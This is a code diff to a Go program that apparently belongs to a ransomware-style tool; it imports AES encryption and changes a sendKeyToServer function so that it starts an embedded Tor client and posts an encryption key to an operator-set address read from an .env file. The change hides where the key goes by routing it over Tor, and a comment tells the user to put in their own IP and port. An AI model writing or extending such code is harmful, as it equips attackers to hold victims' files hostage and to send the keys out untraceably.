@@ -1,6 +1,7 @@
 package main
 
 import (
+	"context"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
@@ -11,7 +12,9 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"time"
 
+	"github.com/cretz/bine/tor"
 	"github.com/joho/godotenv"
 )
 
@@ -58,17 +61,35 @@ func main() {
 
 }
 
-func sendKeyToServer(key string) {
+func sendKeyToServer(key string) error {
+	t, err := tor.Start(context.TODO(), nil)
+	if err != nil {
+		return err
+	}
+	defer t.Close()
+	// Wait at most a minute to start network and get
+	dialCtx, dialCancel := context.WithTimeout(context.Background(), time.Minute)
+	defer dialCancel()
+	// Make connection
+	dialer, err := t.Dialer(dialCtx, nil)
+	if err != nil {
+		return err
+	}
+	httpClient := &http.Client{Transport: &http.Transport{DialContext: dialer.DialContext}}
 
 	// change the url to your ip address and port
 	godotenv.Load("../.env")
-	URL := "http://" + os.Getenv("IP") + ":" + os.Getenv("PORT")
+	address := os.Getenv("ADDRESS")
 
-	resp, err := http.PostForm(URL, url.Values{"key": {key}})
+	URL := "http://" + address
+
+	resp, err := httpClient.PostForm(URL, url.Values{"key": {key}})
 
 	if err != nil {
 		panic(err.Error())
 	}
 
 	defer resp.Body.Close()
+
+	return err
 }
